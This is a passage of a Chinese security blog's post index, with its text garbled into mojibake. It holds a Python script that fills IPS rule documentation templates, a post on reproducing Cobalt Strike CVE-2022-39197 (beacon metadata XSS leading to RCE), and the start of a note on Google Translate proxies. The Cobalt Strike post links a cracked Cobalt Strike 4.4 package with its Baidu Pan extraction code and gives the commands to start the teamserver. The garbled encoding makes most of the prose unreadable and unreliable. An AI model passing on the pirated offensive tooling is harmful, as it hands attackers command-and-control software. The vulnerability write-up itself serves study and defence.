·ï¼Œæ‰€ä»¥é‡‡ç”¨ä¸€ä¸ªå˜é‡ï¼Œç»Ÿä¸€å¡«å…¥ï¼‰ã€å½±å“çš„ç³»ç»Ÿã€æ¼æ´ç±»å‹ã€æ”»å‡»é“¾ï¼ˆå¯¹äºæ¼æ´æ¨¡æ¿æ¥è¯´ï¼Œç­‰çº§ã€æ”»å‡»é“¾è¿™äº›å˜åŠ¨çš„ä¸å¤šï¼Œæ‰€ä»¥å¯ä»¥é€‚å½“å‡å°‘å˜é‡ã€‚æ ¹æ®æ¨¡æ¿ä¸åŒæ¥è°ƒæ•´ï¼‰ã€ç›®æ ‡è®¾å¤‡ï¼ˆå’Œå½±å“çš„ç³»ç»Ÿä¸€è‡´ï¼Œé‡‡ç”¨ä¸€ä¸ªå˜é‡ï¼Œç»Ÿä¸€å¡«å…¥ï¼‰ è‡ªåŠ¨å†™å…¥åŠŸèƒ½ é€‚ç”¨äºå¯ä»¥ä»ruleä¸­ç›´æ¥è¯»å–ï¼Œç„¶åå¡«å…¥txtä¸­çš„å†…å®¹ã€‚pyå°†ä¼šè‡ªåŠ¨åŒ–å®ç°ã€‚éœ€è¦è‡ªåŠ¨åŒ¹é…çš„å†…å®¹æœ‰ï¼šsidã€CVEç¼–å·ã€‚è¯»å…¥ruleï¼Œå†™è¿›txtã€‚ ä¿®æ”¹æ–‡ä»¶å æ–‡ä»¶æœ€ç»ˆéœ€è¦ä¿®æ”¹ä¸ºsid.txt è‡ªåŠ¨ç”Ÿæˆlanguage.txt å°†è·å–åˆ°çš„æ‰‹åŠ¨è¾“å…¥çš„è‡ªåŠ¨ç¿»è¯‘ï¼Œç”Ÿæˆä¸€ä¸ªç¿»è¯‘æ–‡æ¡£ å®ç°è¿‡ç¨‹éš¾ç‚¹ä¸€ï¼šè§£å†³txtä¸­å˜é‡å®šä¹‰çš„é—®é¢˜åœ¨å›ºå®šä½ç½®è®¾ç½®ç‰¹æ®Šå­—ç¬¦__SID__æ¥å ä½ã€‚ä¹‹åç”¨å…·ä½“çš„æ•°æ®æ¥æ›¿æ¢æ‰è¿™ä¸ªå ä½ç¬¦ï¼Œå°±å¯ä»¥èµ·åˆ°ä¸€ä¸ªå˜é‡çš„ä½œç”¨ éš¾ç‚¹äºŒï¼šä¸€ä¸ªruleæ–‡ä»¶æœ‰å¤šæ¡ruleï¼Œæ€ä¹ˆèƒ½å‡†ç¡®åŒ¹é…åˆ°éœ€è¦çš„é‚£ä¸ªruleåœ¨æ¯ä¸ªpyåŠŸèƒ½æ‰§è¡Œå‰ï¼Œéƒ½éœ€è¦è¾“å…¥sidã€‚åœ¨è¯»å–æ–‡æœ¬æ—¶ï¼Œä¼šå…ˆæ ¹æ®sidï¼Œå†è¯»ç‰¹å®šçš„ruleã€‚å»åŒ¹é…ã€‚ä½†æ˜¯è¿™ä¸ªåŠŸèƒ½ä¸å¥½å®ç°ã€‚æš‚æ—¶å…ˆä¸å®ç°ã€‚æ‰‹åŠ¨å°†æ‰€æœ‰çš„ruleéƒ½æå–å‡ºæ¥ï¼Œå˜æˆä¸€ä¸ªå•ç‹¬çš„æ–‡æœ¬ã€‚ æ‰‹åŠ¨æ›¿æ¢æ–‡æ¡£é‡Œçš„rule.txtã€‚æ¯æ¬¡ä¸€æ¡ éš¾ç‚¹ä¸‰ï¼šè·å–æ–‡æœ¬ä¸­ç‰¹å®šçš„å†…å®¹æŸ¥æ‰¾ä½ç½®ï¼ˆè¿”å›çš„æ˜¯æŸ¥æ‰¾å†…å®¹æ‰€åœ¨æ•°ç»„ä½ç½®ï¼‰https://blog.csdn.net/weixin_43718786/article/details/114102454 åˆ†å‰²ï¼ˆæ‰¾åˆ°ä¹‹åï¼Œå¦‚ä½•å°†éœ€è¦çš„å†…å®¹æå–å‡ºæ¥ï¼‰ https://blog.csdn.net/weixin_43718786/article/details/114102454 è¾“å‡ºç‰¹å®šä½ç½®çš„å­—ç¬¦ï¼šhttps://blog.csdn.net/qq_51574759/article/details/116807925 éš¾ç‚¹å››ï¼šæ›´å¤æ‚çš„åŒ¹é…åŒ¹é…æƒ³è¦å†…å®¹çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨æ­£åˆ™åŒ¹é…ã€å¾…å®šã€‘ ä»£ç å‚è€ƒå·²åŒæ­¥è‡³GitHubï¼Œæ–‡æ¡£å†…å®¹æ¶‰å¯†ï¼Œæ‰€ä»¥å°†æ–‡æ¡£éƒ¨åˆ†æ”¹åŠ¨ã€‚å¯ä»¥å‚è€ƒä»£ç æ€æƒ³ã€‚ https://github.com/Gryffinbit/AutoDoc/tree/main 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166import codecsimport reimport os, sysfrom shutil import copyfiledef sidReturn(): return siddef cveReturn(): return cveclass Auto: # ä¸éœ€è¦è¾“å‡ºå’Œè¾“å…¥ã€è‡ªåŠ¨åŒ–è¿›è¡Œæ›¿æ¢ def __init__(self): self.contents_rule = None self.contents_tmpl = None def init(self): self.read() self.replace() self.test() sidReturn() cveReturn() def read(self): # è¯»å–è§„åˆ™æ–‡æ¡£ with open(&#x27;/Users/gryffinbit/PycharmProjects/AutoDoc/å·¥æ§æ¨¡æ¿/rule.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f0: contents_rule = f0.read() self.contents_rule = contents_rule # è¯»å–Templateè§„åˆ™æ–‡æ¡£ with open(&quot;/Users/gryffinbit/PycharmProjects/AutoDoc/å·¥æ§æ¨¡æ¿/Template_ICS.txt&quot;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f1: contents_tmpl = f1.read() self.contents_tmpl = contents_tmpl def replace(self): # åœ¨ruleä¸­æŸ¥æ‰¾sidã€cveç¼–å· sid_loc_rule = self.contents_rule.rfind(&#x27;sid:&#x27;) sid_row_rule = self.contents_rule[int(sid_loc_rule) + 4:] cve_loc_rule = self.contents_rule.rfind(&#x27;cve&#x27;) cve_row_rule = self.contents_rule[int(cve_loc_rule) + 4:] # æå–å·²ç»è·å–åˆ°çš„sidã€cve global sid global cve sid = sid_row_rule.split(&quot;;&quot;)[0] # æå–åˆ†å‰²åçš„å‰åŠéƒ¨åˆ†ã€‚å¼•å·ä¸­çš„æ˜¯æŸ¥æ‰¾çš„ç‰¹å®šå†…å®¹ cve = str(&quot;CVE-&quot;) + cve_row_rule.split(&quot;;&quot;)[0] # æ›¿æ¢Templateè§„åˆ™æ–‡æ¡£çš„sidã€cve self.contents_tmpl = self.contents_tmpl.replace(&quot;__SID__&quot;, str(sid)) self.contents_tmpl = self.contents_tmpl.replace(&quot;__CVE__&quot;, str(cve)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f2: f2.write(self.contents_tmpl) def test(self): # print(self.contents_rule) print(&quot;è‡ªåŠ¨åŒ–æ›¿æ¢æˆåŠŸ\\n-------------------&quot;)class Interact: # æ‰‹åŠ¨æ›¿æ¢ï¼Œéœ€è¦è¿›è¡Œè¾“å‡ºè¾“å…¥ï¼Œè¿›è¡Œäººå·¥çš„äº¤äº’ def __init__(self): self.msg_ch = None self.contents_tmpl_interact = None self.contents_rule_interact = None def init(self): self.read() self.display() self.write() self.translate() def read(self): # è¯»å–è§„åˆ™æ–‡æ¡£ with open(&#x27;/Users/gryffinbit/PycharmProjects/AutoDoc/å·¥æ§æ¨¡æ¿/rule.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f3: contents_rule_interact = f3.read() self.contents_rule_interact = contents_rule_interact # è¯»å–Templateè§„åˆ™æ–‡æ¡£ with open(&#x27;Template_ICS.txt&#x27;, &#x27;r&#x27;, encoding=&#x27;gb2312&#x27;) as f4: contents_tmpl_interact = f4.read() self.contents_tmpl_interact = contents_tmpl_interact def display(self): # æœ€å¼€å§‹éœ€è¦ä¸€ä¸ªè¾“å‡ºï¼Œè¯»å–ruleæ–‡ä»¶ï¼Œå°†msgã€cveæ‰“å°å‡ºæ¥ã€‚é€‚ç”¨äºé‚£äº›éœ€è¦æŸ¥èµ„æ–™çš„éƒ¨åˆ†ã€‚ print(cve) msg_loc_rule = self.contents_rule_interact.rfind(&#x27;msg:&#x27;) msg_row_rule = self.contents_rule_interact[int(msg_loc_rule) + 4:] msg = msg_row_rule.split(&quot;;&quot;)[0] print(msg) def write(self): &quot;&quot;&quot; msgç¿»è¯‘å†…å®¹ &quot;&quot;&quot; print(&quot;è¾“å…¥msgç¿»è¯‘&quot;) msg_ch = input() self.msg_ch = msg_ch # æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½® self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__MSG__&quot;, str(msg_ch)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; æ¼æ´é€ æˆçš„å½±å“ &quot;&quot;&quot; print(&quot;è¾“å…¥æ¼æ´é€ æˆçš„å½±å“&quot;) info = input() # æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½® self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__info__&quot;, str(info)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; CVEå†…å®¹ &quot;&quot;&quot; print(&quot;è¾“å…¥CVEçš„å†…å®¹&quot;) cve_info = input() # æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½® self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__CVEINFO__&quot;, str(cve_info)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; å½±å“çš„ç³»ç»Ÿ &quot;&quot;&quot; print(&quot;è¾“å…¥å½±å“çš„ç³»ç»Ÿ&quot;) affect_s = input() # æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½® self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__AS__&quot;, str(affect_s)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; æ¼æ´ç±»å‹ï¼ˆå…¶ä»–æ¼æ´åˆ©ç”¨ã€ä¿¡æ¯æ³„éœ²æ¼æ´åˆ©ç”¨ç­‰ï¼‰&quot;&quot;&quot; print(&quot;è¾“å…¥æ¼æ´ç±»å‹&quot;) cve_type = input() # æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½® self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__Type__&quot;, str(cve_type)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) &quot;&quot;&quot; æ‰€å±æ”»å‡»é“¾ï¼ˆå¯å±äºä¸åŒé˜¶æ®µã€æ‰§è¡Œç­‰ï¼‰&quot;&quot;&quot; print(&quot;è¾“å…¥æ‰€å±æ”»å‡»é“¾&quot;) kill_chain = input() # æ›¿æ¢åˆ°ç›¸åº”çš„ä½ç½® self.contents_tmpl_interact = self.contents_tmpl_interact.replace(&quot;__KCType__&quot;, str(kill_chain)) # å°†å·²ç»æ›¿æ¢å¥½çš„å†…å®¹å†™å…¥ with open(&#x27;Template_ICS.txt&#x27;, &#x27;w&#x27;, encoding=&#x27;gb2312&#x27;) as f5: f5.write(self.contents_tmpl_interact) def translate(self): f = open(&quot;/Users/gryffinbit/PycharmProjects/AutoDoc/è¾“å‡ºæ–‡æ¡£/ips_language.txt&quot;, &quot;a&quot;, encoding=&quot;gb2312&quot;) # ä»¥å†™çš„æ ¼å¼æ‰“å¼€å…ˆæ‰“å¼€æ–‡ä»¶ f.write(str(sid) + &#x27;;&#x27; + &#x27;æ£€æµ‹åˆ°&#x27; + self.msg_ch + &#x27;ï¼ˆ&#x27; + str(cveReturn()) + &#x27;ï¼‰&#x27;) f.write(&#x27;\\n&#x27;) f.close()if __name__ == &#x27;__main__&#x27;: Auto().init() Interact().init() # æ–‡æ¡£æ”¹å¥½åï¼Œéœ€è¦ä¿®æ”¹æ–‡ä»¶åï¼Œæ”¹æˆsid.txt name = sidReturn() + &quot;.txt&quot; os.rename(&quot;Template_ICS.txt&quot;, &quot;/Users/gryffinbit/PycharmProjects/AutoDoc/è¾“å‡ºæ–‡æ¡£/ipsdocs/&quot; + name)","categories":[{"name":"åˆ›æ„å¼€å‘","slug":"åˆ›æ„å¼€å‘","permalink":"https://gryffinbit.top/categories/%E5%88%9B%E6%84%8F%E5%BC%80%E5%8F%91/"}],"tags":[],"author":"Gryffinbit"},{"title":"Cobalt Strike è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2022-39197ï¼‰","slug":"Cobalt-Strike-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2022-39197ï¼‰","date":"2022-09-30T09:54:30.000Z","updated":"2024-11-12T06:59:46.000Z","comments":true,"path":"2022/09/30/Cobalt-Strike-è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´å¤ç°ï¼ˆCVE-2022-39197ï¼‰/","permalink":"https://gryffinbit.top/2022/09/30/Cobalt-Strike-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%EF%BC%88CVE-2022-39197%EF%BC%89/","excerpt":"","text":"å‰è¨€Cobalt Strikeä»‹ç» Cobalt Strikeæ˜¯ä¸€æ¬¾æ¸—é€æµ‹è¯•ç¥å™¨ã€‚åˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨åªæœ‰ä¸€ä¸ªï¼Œå®¢æˆ·ç«¯å¯ä»¥æœ‰å¤šä¸ªï¼Œå¯è¢«å›¢é˜Ÿè¿›è¡Œåˆ†å¸ƒå¼åå›¢æ“ä½œã€‚ Cobalt Strikeé›†æˆäº†ç«¯å£è½¬å‘ã€æ‰«æå¤šæ¨¡å¼ç«¯å£Listenerã€Windows exeç¨‹åºç”Ÿæˆã€Windows dllåŠ¨æ€é“¾æ¥åº“ç”Ÿæˆã€javaç¨‹åºç”Ÿæˆã€officeå®ä»£ç ç”Ÿæˆï¼ŒåŒ…æ‹¬ç«™ç‚¹å…‹éš†è·å–æµè§ˆå™¨çš„ç›¸å…³ä¿¡æ¯ç­‰ã€‚ å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨ç«¯çš„è¿æ¥ Cobalt Strikeä½¿ç”¨C&#x2F;Sæ¶æ„ï¼ŒCobalt Strikeçš„å®¢æˆ·ç«¯è¿æ¥åˆ°å›¢é˜ŸæœåŠ¡å™¨ï¼Œå›¢é˜ŸæœåŠ¡å™¨è¿æ¥åˆ°ç›®æ ‡ï¼Œä¹Ÿå°±æ˜¯è¯´Cobalt Strikeçš„å®¢æˆ·ç«¯ä¸ä¸ç›®æ ‡æœåŠ¡å™¨è¿›è¡Œäº¤äº’ã€‚å›¢é˜ŸæœåŠ¡å™¨éœ€è¦è‡ªè¡Œå¼€å¯ï¼Œåªèƒ½è¿è¡Œåœ¨Linuxç¯å¢ƒä¸‹ã€‚å®¢æˆ·ç«¯è¾“å…¥å›¢é˜ŸæœåŠ¡å™¨çš„å¤–éƒ¨IPåœ°å€ã€è¿æ¥å¯†ç ï¼Œå³å¯è¿æ¥ã€‚ å¤šä¸ªå›¢é˜ŸæœåŠ¡å™¨ä¹‹é—´ä¹Ÿå¯ä»¥äº’ç›¸è¿æ¥ã€‚è¿™æ ·è®¾è®¡çš„ç›®çš„åœ¨äºè¿è¡Œå®‰å…¨ï¼Œå¦‚æœä¸€ä¸ªå›¢é˜ŸæœåŠ¡å™¨åœæ­¢è¿è¡Œäº†ï¼Œä¹Ÿä¸ä¼šå¯¼è‡´æ•´ä¸ªè¡ŒåŠ¨çš„å¤±è´¥ã€‚ æ—¥å¿—ä¸æŠ¥å‘Š æ—¥å¿—è®°å½•ï¼šè®°å½•åœ¨å›¢é˜ŸæœåŠ¡å™¨ä¸‹çš„è¿è¡Œç›®å½•ä¸­çš„logsæ–‡ä»¶å†…ï¼Œæ—¥å¿—æ–‡ä»¶åä¸ºbeacon_ä¼šè¯IDã€‚æŒ‰é”®çš„æ—¥å¿—åœ¨keystrokesæ–‡ä»¶å¤¹å†…ï¼Œæˆªå±çš„æ—¥å¿—åœ¨screenshotsæ–‡ä»¶å¤¹å†…ã€‚ å¯¼å‡ºæŠ¥å‘Šï¼šè¾“å‡ºæ ¼å¼ä¸ºPDFæˆ–Wordï¼›å¯ä»¥è¾“å‡ºè‡ªå®šä¹‰æŠ¥å‘Šä¸”æ›´æ”¹å›¾æ ‡ï¼›å¯ä»¥åˆå¹¶å¤šä¸ªå›¢é˜ŸæœåŠ¡å™¨çš„æŠ¥å‘Šï¼Œå¹¶å¯ä»¥å¯¹ä¸åŒæŠ¥å‘Šé‡Œçš„æ—¶é—´è¿›è¡Œæ ¡æ­£ æŠ¥å‘Šç±»å‹ï¼š æ´»åŠ¨æŠ¥å‘Šï¼šçº¢é˜Ÿæ´»åŠ¨æ—¶é—´è¡¨ï¼Œè®°å½•äº†æ¯ä¸ªåæ¸—é€æ´»åŠ¨ ä¸»æœºæŠ¥å‘Šï¼šæ±‡æ€»äº†csæ”¶é›†çš„ä¸»æœºä¿¡æ¯ï¼Œå‡­æ®ã€æœåŠ¡å’Œä¼šè¯ä¹Ÿä¼šåœ¨æ­¤æŠ¥å‘Šä¸­ã€‚ ä¾µå®³æŒ‡æ ‡æŠ¥å‘Šï¼š æ­¤æŠ¥å‘Šä¸­åŒ…æ‹¬å¯¹C2æ‹“å±•æ–‡ä»¶çš„åˆ†æã€ä½¿ç”¨çš„åŸŸååŠä¸Šä¼ æ–‡ä»¶çš„MD5å“ˆå¸Œã€‚ C2 å°±æ˜¯ Command &amp; Control Server çš„ç®€ç§°ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤ä¸æ§åˆ¶æœåŠ¡å™¨ã€‚ ä¼šè¯æŠ¥å‘Šï¼ˆSessions Reportï¼‰ æ­¤æŠ¥å‘Šä¸­è®°å½•äº†æŒ‡æ ‡å’Œæ´»åŠ¨ï¼ŒåŒ…æ‹¬æ¯ä¸ªä¼šè¯å›è¿åˆ°è‡ªå·±çš„é€šä¿¡è·¯å¾„ã€åæ¸—é€æ´»åŠ¨çš„æ—¶é—´çº¿ç­‰ã€‚ ç¤¾å·¥æŠ¥å‘Šï¼ˆSocial Engineering Reportï¼‰ æ­¤æŠ¥å‘Šä¸­è®°å½•äº†æ¯ä¸€è½®ç½‘ç»œé’“é±¼çš„ç”µå­é‚®ä»¶ã€è°ç‚¹å‡»ä»¥åŠä»æ¯ä¸ªç‚¹å‡»ç”¨æˆ·é‚£é‡Œæ”¶é›†çš„ä¿¡æ¯ã€‚è¯¥æŠ¥å‘Šè¿˜æ˜¾ç¤ºäº†Cobalt Strikeçš„System profilerå‘ç°çš„åº”ç”¨ç¨‹åºã€‚ æˆ˜æœ¯ã€æŠ€å·§å’Œç¨‹åºæŠ¥å‘Šï¼ˆTactics,Techniques,and Proceduresï¼‰ æ­¤æŠ¥å‘Šå°†è‡ªå·±çš„Cobalt Strikeè¡ŒåŠ¨æ˜ å°„åˆ°MITREçš„ATT&amp;CKçŸ©é˜µä¸­çš„æˆ˜æœ¯ï¼Œå…·ä½“å¯å‚è€ƒhttps://attack.mitre.org/(opens new window) ç›‘å¬å™¨ç®¡ç†ï¼ˆBeaconï¼‰ ç›‘å¬å™¨ï¼šç­‰å¾…è¢«å…¥ä¾µç³»ç»Ÿè¿æ¥è‡ªå·±çš„ä¸€ä¸ªæœåŠ¡ã€‚ ç›‘å¬å™¨çš„ä½œç”¨ï¼šä¸ºäº†æ¥å—payloadå›ä¼ çš„å„ç±»æ•°æ®ï¼Œç±»ä¼¼äºMSFä¸­handlerçš„ä½œç”¨ã€‚æ¯”å¦‚payloadåœ¨ç›®æ ‡æœºå™¨æ‰§è¡Œä»¥åï¼Œå°±ä¼šå›è¿åˆ°ç›‘å¬å™¨ç„¶åä¸‹è½½æ‰§è¡ŒçœŸæ­£çš„shellcodeä»£ç ã€‚ ä¸€æ—¦ç›‘å¬å™¨å»ºç«‹èµ·æ¥ï¼Œå›¢é˜Ÿæˆå‘˜åªéœ€è¦çŸ¥é“è¿™ä¸ªç›‘å¬å™¨çš„åç§°å³å¯ï¼Œä¸éœ€è¦å…³å¿ƒç›‘å¬å™¨èƒŒåçš„åŸºç¡€ç¯å¢ƒã€‚ stagerï¼šå°±æ˜¯è¿œç¨‹åŠ è½½Beacon.dllçš„shellcode Beacon Staging Severï¼š æ˜¯åˆ†é˜¶æ®µæ¨¡å¼ä¸­ï¼Œæä¾›shellcodeç­‰åŠŸèƒ½æ‰©å±•å­˜å‚¨çš„StageæœåŠ¡å™¨ã€‚å®ƒçš„ä½œç”¨æ˜¯ä¸ºäº†é˜²æ­¢Payloadè¿‡å¤§æˆ–è€…é€‚åº”ä¸åŒçš„æ”»å‡»åœºæ™¯ï¼Œå¯ä»¥åˆ†é˜¶æ®µè¿›è¡ŒpayloadæŠ•é€’ å…ƒæ•°æ®ï¼šæè¿°æ•°æ®çš„æ•°æ®ï¼Œä¸»è¦æ˜¯æè¿°æ•°æ®å±æ€§çš„ä¿¡æ¯ï¼Œç”¨æ¥æ”¯æŒå¦‚ï¼šæŒ‡ç¤ºå­˜å‚¨ä½ç½®ã€å†å²æ•°æ®ã€èµ„æºæŸ¥æ‰¾ã€æ–‡ä»¶è®°å½•ç­‰åŠŸèƒ½ã€‚æ˜¯ä¸€ç§ç”µå­å¼ç›®å½•ã€‚ cookieåŠ å¯†è¿‡ç¨‹ æ”»å‡»è€…åˆ©ç”¨CS severç”Ÿæˆæ–°çš„Beaconç›‘å¬ï¼ˆåŒ…æ‹¬ä¸€å¯¹éå¯¹ç§°å…¬ç§é’¥ï¼‰å¹¶ç”Ÿæˆstager æ”»å‡»è€…æŠ•é€’Stageråˆ°å—æ§ä¸»æœº å—æ§ä¸»æœºåœ¨Exploité˜¶æ®µæ‰§è¡Œå°å·§çš„Stager å—æ§ä¸»æœºæ ¹æ®Stager Urlè¯·æ±‚ç‰¹å¾å‘Beacon Staging Sever ä¸‹è½½ä½“ç§¯è¾ƒå¤§æ›´å¤æ‚çš„Stageråˆ°æœ¬åœ°ï¼ŒBeacon Staging Serverä¼šæ ¡éªŒURLçš„åˆæ³•æ€§ã€‚ Stageè§£å¯†å¹¶è§£æBeaconé…ç½®ä¿¡æ¯ï¼ˆæ¯”å¦‚å…¬é’¥PublicKeyã€C2 serverä¿¡æ¯ï¼‰ Stageé€šè¿‡å…¬é’¥åŠ å¯†ä¸»æœºçš„å…ƒæ•°æ®å¹¶å‘é€è‡³C2 Server C2 Server ç”¨ç§é’¥è§£å¯†æ•°æ®è·å–ä¸»æœºå…ƒæ•°æ® stager urlï¼Œå¯ä»¥ä½œä¸ºç‰¹å¾æ¥è¯†åˆ«CSæœåŠ¡å™¨ã€‚CSä¸­çš„Stager URLæ ¡éªŒç®—æ³•ï¼Œå°±æ˜¯ç”Ÿæˆ4ä½éšæœºæ ¡éªŒç ï¼Œå°†æ ¡éªŒç æ‹¼æ¥åˆ°URLåé¢ï¼Œå³å¯è¯·æ±‚åˆ°Stageçš„ä»£ç  æ¼æ´é€šå‘ŠCVE-2022-39197ï¼šè¯¥æ¼æ´å­˜åœ¨äºCobalt Strikeçš„Beaconè½¯ä»¶ä¸­ï¼Œç”±äºCobalt Strike ä½¿ç”¨ GUI æ¡†æ¶ SWINGå¼€å‘ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹æ”»å‡»è€…å¯é€šè¿‡åœ¨ beacon å…ƒæ•°æ®ä¸­æ³¨å…¥æ¶æ„ HTML æ ‡ç­¾ï¼Œä½¿å¾—CSå¯¹å…¶è¿›è¡Œè§£ææ—¶åŠ è½½æ¶æ„ä»£ç ï¼Œä»è€Œå¯¼è‡´åœ¨CSæœåŠ¡ç«¯ä¸Šé€ æˆè¿œç¨‹ä»£ç æ‰§è¡Œã€‚ã€å…è®¸æ”»å‡»è€…åœ¨Beaconé…ç½®ä¸­è®¾ç½®æ ¼å¼é”™è¯¯çš„ç”¨æˆ·åï¼Œè§¦å‘XSSã€‘ å½±å“ç‰ˆæœ¬ï¼šCobalt Strike &lt;&#x3D; 4.7 å¤ç°çš„å¤§è‡´æ­¥éª¤ ç ´è§£checksum8ç®—æ³•ï¼Œè·å–æ–‡ä»¶ï¼Œè§£æå…¬é’¥ã€‚æœ‰å…¬é’¥çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥ç›´æ¥ä¸Šçº¿æœºå™¨ã€‚ xsså¤ç°åŸç† å¡«å†™è‡ªå·±çš„ä¸»æœºåã€‚ä¼šä¸€ç›´è¯·æ±‚ï¼Œä½†è¯·æ±‚ä¸åˆ°ï¼Œä¼šæ–­è£‚ã€‚ ç¯å¢ƒé…ç½®ç ´è§£åŒ…ï¼š[cobalt_strike_4.4](é“¾æ¥: https://pan.baidu.com/s/1oSQkGbUtssgCDlAKi3lfdA?pwd=r5w3 æå–ç : r5w3â€“æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜v6çš„åˆ†äº«) ï¼ˆå®¢æˆ·ç«¯ã€æœåŠ¡å™¨ç«¯ï¼Œéƒ½ç”¨è¿™ä¸ªï¼‰ å®¢æˆ·ç«¯ï¼š kali Linux 2021.3 æœåŠ¡ç«¯ï¼šè…¾è®¯äº‘ ubuntu æœåŠ¡å™¨ç«¯ 1234cd cobalt_strike_4.4chmod +x teamserverchmod +x cobaltstrike ./teamserver æœåŠ¡å™¨çš„ipï¼ˆæœ¬æœºipï¼‰ å¯†ç  å®¢æˆ·ç«¯ 1cd cobalt_strike_4.4 12chmod +x cobaltstrike./cobaltstrike å‚è€ƒæ–‡ç« https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html https://mp.weixin.qq.com/s/ONgQy5AyEjPtloTcXSP0yg http://blog.leanote.com/post/snowming/50448511de58 https://cloud.tencent.com/developer/article/1921473 https://www.ddosi.org/cobalt-strike-4-7/ https://forum.butian.net/share/708 w","categories":[{"name":"æ¼æ´å¤ç°","slug":"æ¼æ´å¤ç°","permalink":"https://gryffinbit.top/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"}],"tags":[{"name":"Cobalt Strike","slug":"Cobalt-Strike","permalink":"https://gryffinbit.top/tags/Cobalt-Strike/"},{"name":"CVE-2022-39197","slug":"CVE-2022-39197","permalink":"https://gryffinbit.top/tags/CVE-2022-39197/"}],"author":"Gryffinbit"},{"title":"googleé¡µé¢è‡ªåŠ¨ç¿»è¯‘å¤±æ•ˆæˆ–é€Ÿåº¦æ…¢","slug":"googleé¡µé¢è‡ªåŠ¨ç¿»è¯‘å¤±æ•ˆæˆ–é€Ÿåº¦æ…¢","date":"2022-09-29T16:20:29.000Z","updated":"2024-11-12T06:59:42.000Z","comments":true,"path":"2022/09/30/googleé¡µé¢è‡ªåŠ¨ç¿»è¯‘å¤±æ•ˆæˆ–é€Ÿåº¦æ…¢/","permalink":"https://gryffinbit.top/2022/09/30/google%E9%A1%B5%E9%9D%A2%E8%87%AA%E5%8A%A8%E7%BF%BB%E8%AF%91%E5%A4%B1%E6%95%88%E6%88%96%E9%80%9F%E5%BA%A6%E6%85%A2/","excerpt":"","text":"è°·æ­Œå·²ç»åœæ­¢äº†å¯¹ä¸­å›½å¤§é™†çš„æœåŠ¡ã€‚ è°·æ­Œè‡ªåŠ¨ç¿»è¯‘æœ‰æ—¶å€™ä¼šå¤±æ•ˆï¼Œæˆ–è€…é€Ÿåº¦æ…¢ï¼Œå¯èƒ½æ˜¯å› ä¸ºå›½å†…åŸŸåçš„å±è”½ã€‚è¿™æ ·çš„è¯ï¼Œå¯ä»¥æŠŠè°·æ­Œç¿»è¯‘ç›¸å…³çš„åŸŸåï¼ŒåŠ è¿›ä»£ç†é‡Œï¼Œèµ°å›½å¤–çš„ä»£ç†æµé‡ï¼Œå°±å¯ä»¥é¡ºåˆ©ç¿»è¯‘äº†ã€‚ 